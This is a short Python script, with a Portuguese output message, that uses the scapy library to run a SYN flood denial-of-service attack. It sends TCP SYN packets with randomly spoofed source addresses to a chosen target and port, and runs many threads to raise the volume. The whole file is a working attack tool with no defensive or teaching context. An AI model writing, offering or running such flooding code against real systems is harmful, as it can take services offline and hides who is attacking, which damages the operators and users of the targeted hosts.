from scapy.all import IP, TCP, RandIP, send
import threading
from concurrent.futures import ThreadPoolExecutor


def send_syn_packet(destiny, destiny_port):
        source = RandIP()

        ip_packet = IP(src=source, dst=destiny)
        syn_packet = TCP(dport=destiny_port, flags="S")

        complete_packet = ip_packet / syn_packet
        send(complete_packet, verbose=False)
    
    
def synflood(destiny, destiny_port, num_of_packets, num_of_workers):
    with ThreadPoolExecutor(max_workers=num_of_workers) as executor:
        for _ in range(num_of_packets):
            executor.submit(send_syn_packet, destiny, destiny_port)

    print(f"Total de pacotes enviados: {num_of_packets}")





